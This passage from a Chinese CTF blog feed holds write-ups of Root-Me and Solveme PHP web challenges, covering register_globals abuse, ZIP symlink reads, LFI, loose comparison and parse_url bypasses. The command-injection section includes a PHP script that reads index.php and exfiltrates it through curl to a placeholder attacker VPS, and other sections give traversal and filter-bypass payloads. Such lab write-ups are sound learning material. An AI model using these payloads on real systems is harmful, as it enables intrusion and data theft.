class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;'</span>;</span><br><span class="line">    <span class="keyword">return</span> $aff;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">isset</span>($_SESSION[<span class="string">"logged"</span>]) )</span><br><span class="line">    $_SESSION[<span class="string">"logged"</span>]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">$aff=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.inc.php"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"password"</span>]))</span><br><span class="line">    $password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ini_get(<span class="string">'register_globals'</span>)) &#123;</span><br><span class="line">    $superglobals = <span class="keyword">array</span>($_SERVER, $_ENV,$_FILES, $_COOKIE, $_POST, $_GET);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION)) &#123;</span><br><span class="line">        array_unshift($superglobals, $_SESSION);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($superglobals <span class="keyword">as</span> $superglobal) &#123;</span><br><span class="line">        extract($superglobal, <span class="number">0</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (( <span class="keyword">isset</span> ($password) &amp;&amp; $password!=<span class="string">""</span> &amp;&amp; auth($password,$hidden_password)==<span class="number">1</span>) || (is_array($_SESSION) &amp;&amp; $_SESSION[<span class="string">"logged"</span>]==<span class="number">1</span> ) )&#123;</span><br><span class="line">    $aff=display(<span class="string">"well done, you can validate with the password : $hidden_password"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $aff=display(<span class="string">"try again"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $aff;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>关键逻辑为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (( <span class="keyword">isset</span> ($password) &amp;&amp; $password!=<span class="string">""</span> &amp;&amp; auth($password,$hidden_password)==<span class="number">1</span>) || (is_array($_SESSION) &amp;&amp; $_SESSION[<span class="string">"logged"</span>]==<span class="number">1</span> ) )&#123;</span><br><span class="line">    $aff=display(<span class="string">"well done, you can validate with the password : $hidden_password"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $aff=display(<span class="string">"try again"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可知我们得到flag有两种方法</p><ul><li>输入的password和系统的passwd相同</li><li>使session中的logged值为1</li></ul><p>前者显然不可能，因为我们并不知道密码是什么，对于后者看标题可知，服务器应该配置了 <code>register globals</code> 为 on，这样的话各种变量都被注入代码，例如来自 HTML 表单的请求变量，所以我们可以以GET方法直接请求变量名</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch17/index.php?_SESSION[logged]=1</span><br></pre></td></tr></table></figure><p>需要注意的是，官方文档中提到</p><blockquote><p>本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。</p></blockquote><p>在较高版本中该漏洞不存在</p><p>PS：这道题目的flag并不是很长而且没有特殊字符，所以理论上应该还存在密码爆破的可能</p><h2 id="File-upload-ZIP"><a href="#File-upload-ZIP" class="headerlink" title="File upload - ZIP"></a>File upload - ZIP</h2><p>题目要求我们读取网站的index.php文件，尝试上传zip文件，网站会自动将我们的zip文件解压并返回文件位置，我们可以读取文件（网站只能够解析TXT文件和图片文件），这显然无法实现我们的目标，我们始终只能够读取我们上传的文本文件或者图片，我们应该试图寻找一种方法能够在文本文件中实现跨文件读取，从而读取目标文件，找了很久的资料，找到了一种方法：<strong>建立symlink（符号索引）</strong> ，类似于windows环境下的快捷方式</p><blockquote><p>符号链接，这个文件包含了另一个文件的路径名。可以是任意文件或目录，也可以链接不同文件系统的文件。甚至可以链接不存在的文件，这就产生一般称为“断裂”的问题（现象），还可以不断的循环链接自己。<br>用ln -s 命令可以生成一个符号链接，如下所示：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s source_file  softlink_file</span><br></pre></td></tr></table></figure></p><p>在对符号链接进行读写操作的时候，系统会自动把该操作转换为对源文件的操作。但是删除链接文件时，系统仅仅删除符号链接文件，而不删除源文件本身。</p></blockquote><p>那么我们可以尝试建立符号链接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s ../../../index.php index</span><br></pre></td></tr></table></figure><p>然后目录下会出现一个index的符号链接，压缩为zip文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -y index.zip index</span><br></pre></td></tr></table></figure><p>然后提交即可读到目标文件，得到flag。</p><h2 id="Command-injection-Filter-bypass"><a href="#Command-injection-Filter-bypass" class="headerlink" title="Command injection - Filter bypass"></a>Command injection - Filter bypass</h2><p>命令执行，用分号不可以了，被过滤了，而且题目不返回执行后的内容，只返回 <code>Ping OK</code> 或者 <code>Syntax Error</code> 等状态信息，尝试 <code>%0a</code> 绕过，得到正常回显，后面还发现 <code>|,&amp;</code> 等也被过滤了，可以尝试反向shell，本来尝试简单的bashshell，但是无法得到稳定的shell，百度了一下资料，找到了一个方法，本题可以使用curl等命令，我们可以尝试在本机上新建一个PHP文件，该文件的功能是读取index.php并发送到指定的主机上；然后执行命令让靶机下载并执行这个文件从而可以在我们的主机上读取到index.php的文件内容。</p><p>具体步骤如下：</p><ul><li>1.在自己的vps上新建一个 <strong>flag.txt</strong> ，不写入任何内容。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi flag.txt</span><br></pre></td></tr></table></figure><ul><li>2.在本地主机上新建一个 <strong>getdata.php</strong> 文件，写入内容如下</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$txt=$_GET[<span class="string">'c'</span>];</span><br><span class="line">$myfile = fopen(<span class="string">"flag.txt"</span>, <span class="string">"a"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</span><br><span class="line">fwrite($myfile, <span class="string">"\r\n"</span>);</span><br><span class="line">fwrite($myfile, $txt);</span><br><span class="line">fclose($myfile);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ok"</span>;</span><br></pre></td></tr></table></figure><ul><li>3.在本地主机上新建一个<strong>sendrequest.txt</strong>文件，写入如下内容</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cSession = curl_init();</span><br><span class="line">$content = bin2hex(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">curl_setopt($cSession,CURLOPT_URL,<span class="string">"http://your_vps_ip/getdata.php?c="</span>.$content);</span><br><span class="line">curl_setopt($cSession,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">curl_setopt($cSession,CURLOPT_HEADER,<span class="keyword">false</span>);</span><br><span class="line">$result = curl_exec($cSession);</span><br><span class="line">curl_close($cSession);</span><br><span class="line"><span class="keyword">echo</span> $result;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>4.向靶机发送请求</li></ul><p><img src="/2018/07/31/rootme/7.png" alt=""></p><ul><li>5.之后在本机上读取flag.txt文件的内容再解码为字符串即可</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag = <span class="string">"************************************"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"ip"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"ip"</span>]))&#123;</span><br><span class="line">        $ip = @preg_replace(<span class="string">"/[\\\$|`;&amp;&lt;&gt;]/"</span>, <span class="string">""</span>, $_POST[<span class="string">"ip"</span>]);</span><br><span class="line">        $response = @shell_exec(<span class="string">"timeout 5 bash -c 'ping -c 3 "</span>.$ip.<span class="string">"'"</span>);</span><br><span class="line">        $receive = @preg_match(<span class="string">"/3 packets transmitted, (.*) received/s"</span>,$response,$out);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($out[<span class="number">1</span>]==<span class="string">"3"</span>) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Ping OK"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span> ($out[<span class="number">1</span>]==<span class="string">"0"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Ping NOK"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Syntax Error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PS：本题我折腾了好久，原因在于我的web服务老是配置错误无法执行PHP文件，还有文件权限配置错误，这两点需要注意。</p><h2 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h2><p>本地文件包含漏洞的利用，可以先试一下文件遍历</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch16/?files=../</span><br></pre></td></tr></table></figure><p>发现有admin文件，访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge01.root-me.org/web-serveur/ch16/?files=../admin&amp;f=index.php</span><br></pre></td></tr></table></figure><p>找一下即可得到flag</p><h2 id="Local-File-Inclusion-Double-encoding"><a href="#Local-File-Inclusion-Double-encoding" class="headerlink" title="Local File Inclusion - Double encoding"></a>Local File Inclusion - Double encoding</h2><p>漏洞点：url二次编码绕过，本题中 <code>. /</code> 等分界符被过滤了，所以可以尝试二次编码绕过 </p><p>百度url编码即可查到各个字符的url编码</p><p>我最开始尝试的是目录跳转，可是没有什么进展，题目返回报错信息</p><p><img src="/2018/07/31/rootme/8.png" alt=""></p><p>看到有个包含的文件后缀是必须是.inc.php，所以尝试获取PHP的配置文件试试看 <code>conf.inc.php</code>，用PHP的filter协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=conf</span><br></pre></td></tr></table></figure><p>然后url编码两次提交再解码即可得到flag。</p><h2 id="PHP-Loose-Comparison"><a href="#PHP-Loose-Comparison" class="headerlink" title="PHP - Loose Comparison"></a>PHP - Loose Comparison</h2><p>本题是一道很基础的PHP弱比较问题，但是这题的代码很长，有点吓到我了，导致我很久都没搞清楚这题的考点，代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_secured_random</span><span class="params">()</span> </span>&#123; <span class="comment">// cause random is the way</span></span><br><span class="line">    $a = rand(<span class="number">1337</span>,<span class="number">2600</span>)*<span class="number">42</span>;</span><br><span class="line">    $b = rand(<span class="number">1879</span>,<span class="number">1955</span>)*<span class="number">42</span>;</span><br><span class="line">    $a &lt; $b ? $a ^= $b ^= $a ^= $b : $a = $b;</span><br><span class="line">    <span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">secured_hash_function</span><span class="params">($plain)</span> </span>&#123; <span class="comment">// cause md5 is the best hash ever</span></span><br><span class="line">    $secured_plain = sanitize_user_input($plain);</span><br><span class="line">    <span class="keyword">return</span> md5($secured_plain);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize_user_input</span><span class="params">($input)</span> </span>&#123; <span class="comment">// cause someone told me to never trust user input</span></span><br><span class="line">    $re = <span class="string">'/[^a-zA-Z0-9]/'</span>;</span><br><span class="line">    $secured_input = preg_replace($re, <span class="string">""</span>, $input);</span><br><span class="line">    <span class="keyword">return</span> $secured_input;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"secret.php"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'s'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'h'</span>])) &#123;</span><br><span class="line">    $s = sanitize_user_input($_POST[<span class="string">'s'</span>]);</span><br><span class="line">    $h = secured_hash_function($_POST[<span class="string">'h'</span>]);</span><br><span class="line">    $r = gen_secured_random();</span><br><span class="line">    <span class="keyword">if</span>($s != <span class="keyword">false</span> &amp;&amp; $h != <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>($s.$r == $h) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Well done! Here is your flag: "</span>.$flag;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Fail..."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"&lt;p&gt;Hum ...&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>关键逻辑如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'s'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'h'</span>])) &#123;</span><br><span class="line">    $s = sanitize_user_input($_POST[<span class="string">'s'</span>]);</span><br><span class="line">    $h = secured_hash_function($_POST[<span class="string">'h'</span>]);</span><br><span class="line">    $r = gen_secured_random();</span><br><span class="line">    <span class="keyword">if</span>($s != <span class="keyword">false</span> &amp;&amp; $h != <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>($s.$r == $h) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Well done! Here is your flag: "</span>.$flag;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>首先提交参数s和t，然后对于s执行验证，控制只能输入英文字符和数字；对于h，也是先验证输入合法性，然后返回提交的字符串md5值，$r变量是一串随机数，最后r拼接在s后面与h的md5值进行 <code>==</code> 比较，此处出现漏洞，那么我们可以令s为 <code>0e</code> 开头的字符串，h为hash值是0e开头的字符串从而绕过验证</p><p><img src="/2018/07/31/rootme/11.png" alt="payload"></p><h2 id="PHP-preg-replace"><a href="#PHP-preg-replace" class="headerlink" title="PHP preg_replace()"></a>PHP preg_replace()</h2><p>题目是一个界面，让我们提交preg_replace()函数需要的参数从而返回相应的结果，查阅官方文档发现如下资料</p><p><img src="/2018/07/31/rootme/9.png" alt="正则匹配修饰符e"></p><p>根据官方文档可以知道，当我们使用使用了e参数后，我们的匹配内容会被当做PHP代码执行，于是我们可以利用这个特性读取flag.php文件</p><p><img src="/2018/07/31/rootme/10.png" alt="payload"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近发现了一个ctf网站，正好闲来没事，自己又非常的菜，所以还要继续学习。&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Solveme题解</title>
    <link href="http://chaosec.top/2018/07/31/solveme/"/>
    <id>http://chaosec.top/2018/07/31/solveme/</id>
    <published>2018-07-31T01:59:41.000Z</published>
    <updated>2018-08-06T03:46:09.371Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在学长的建议下开始做solveme网站的题目，都是代码审计的题目，学到了很多的东西，记录一下</p><a id="more"></a><h1 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h1><p>逆向跑一遍即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag = <span class="string">'1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY='</span>;</span><br><span class="line"><span class="keyword">echo</span> hex2bin(strrev(bin2hex(base64_decode($flag))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h1><p>这个题目是字符串在不同编码下显示不同的问题，如果直接复制粘贴比较的会发生错误，办法是bp抓包查看16进制值提交上去就可以正确比较啦</p><h1 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h1><p>利用PHP的数字解析漏洞，payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?time=6e6</span><br></pre></td></tr></table></figure><h1 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h1><p>这个题目想得到flag就是需要让username和passwd和它隐藏的相等，看到用户名只有三位猜测可能是考察爆破，但是没有爆破成功，到这儿就卡住了，最后看了一下学长博客，才知道这题要用到 <code>curl</code>，这个命令之前几乎没用过，算是一个新知识点，得学习一下了。不知道为什么直接在浏览器中访问index.php页面就不行，用curl命令就可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://hardlogin.solveme.peng.kr/index.php</span><br></pre></td></tr></table></figure><h1 id="URL-filtering"><a href="#URL-filtering" class="headerlink" title="URL filtering"></a>URL filtering</h1><p>分析代码可知，代码大概思路是解析一下url(parse_url)，对于得到的字符串用&amp;分隔为数组，在对于每个数组值以等号分隔出key,value对，要求key中不能出现 <code>do_you_want_flag</code>,value中不能出现 <code>yes</code>，但是再获取flag时又要求必须是 <code>do_you_want_flag=yes</code>，显然是矛盾的，但是在翻看PHP手册查看parse_url函数时发现一句话</p><blockquote><p>对严重不合格的 URL，parse_url() 可能会返回 FALSE。</p></blockquote><p>所以猜测可能是这个parse函数存在突破点，搜索一下发现有个GeekPwn2016ctf比赛中就考过这个知识点，得到payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://urlfiltering.solveme.peng.kr///?do_you_want_flag=yes</span><br></pre></td></tr></table></figure><h1 id="Hash-collision"><a href="#Hash-collision" class="headerlink" title="Hash collision"></a>Hash collision</h1><p>直接数组绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?foo[]=1&amp;bar[]=2</span><br></pre></td></tr></table></figure><h1 id="Array2String"><a href="#Array2String" class="headerlink" title="Array2String"></a>Array2String</h1><p>题目核心在于提交 <code>15th_HackingCamp</code>对应的ascii码值，但是流程又限制数字不能在(32,127)之间，官网查找一下chr函数的描述可以看到如下描述</p><blockquote><p>Note that if the number is higher than 256, it will return the number mod 256.</p></blockquote><p>就是说如果数字大于256的话它会自动取模，所以就简单了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://array2string.solveme.peng.kr/index.php?password=simple_passw0rd&amp;value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368</span><br></pre></td></tr></table></figure><h1 id="Flag-not-found"><a href="#Flag-not-found" class="headerlink" title="Flag not found"></a>Flag not found</h1><h1 id="Give-me-a-link-2"><a href="#Give-me-a-link-2" class="headerlink" title="Give me a link 2"></a>Give me a link 2</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$parse = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?$/i'</span>, $parse[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Not allowed scheme'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i'</span>, $parse[<span class="string">'host'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Not allowed host'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/\/plz_give_me$/'</span>, $parse[<span class="string">'path'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码，题目过滤了几个条件</p><blockquote><p>1、 url中不能出现 <code>_</code> 以及其他不可见字符<br>2、 path字段中又必须出现 <code>plz_give_me</code> 字段<br>3、 限制输入的网址必须是 <code>localhost</code> 或 <code>127.x.x.x</code> 这种类型的网址</p></blockquote><p>1和2冲突，可以用前面一题的方法绕过之<br>对于第三个，有个绕过方法就是 <code>ip2long()</code> 函数将网络地址转化为数字地址，这样就可以绕过.的ip过滤</p><p>所以最终payload为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://givemealink2.solveme.peng.kr/?url=https:num_ip:12580/plz%0agive%0ame</span><br></pre></td></tr></table></figure><h1 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h1><p>关键代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?\:\/\/'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/i'</span>, $url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Not allowed URL'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $parse = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>($parse[<span class="string">'path'</span>] !== <span class="string">'/plz_give_me'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $parse[<span class="string">'scheme'</span>].<span class="string">'://'</span>.$parse[<span class="string">'host'</span>].<span class="string">'/'</span>.$flag);</span><br></pre></td></tr></table></figure><p>第一个和第三个的条件矛盾，具体参见前文，其中 <code>$_SERVER[&#39;HTTP_HOST&#39;]</code> 又和</p><p><code>curl_setopt($ch, CURLOPT_URL, $parse[&#39;scheme&#39;].&#39;://&#39;.$parse[&#39;host&#39;].&#39;/&#39;.$flag);</code> </p><p>矛盾，因为http_host内容找不不允许修改，但是查看PHP手册可知</p><blockquote><p>$url = ‘<a href="http://username:password@hostname/path?arg=value#anchor" target="_blank" rel="noopener">http://username:password@hostname/path?arg=value#anchor</a>‘;</p></blockquote><p>这样的方式也可以解析url，所以构造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://givemealink.solveme.peng.kr/?url=http://givemealink.solveme.peng.kr@ip_addr/plz%1agive%1ame</span><br></pre></td></tr></table></figure><p>注意要先监听80端口,还要不要用https，因为https返回的数据是乱码：）</p><h1 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h1><p>关键代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'say'</span>]) &amp;&amp; strlen($_GET[<span class="string">'say'</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">    $say = preg_replace(<span class="string">'/^(.*)flag(.*)$/'</span>, <span class="string">'$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;'</span>, $_GET[<span class="string">'say'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/give_me_the_flag/'</span>, $say))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'What the f**k?'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看学长的博客get到了新姿势，这个题目绕过的点在 <code>.*</code> 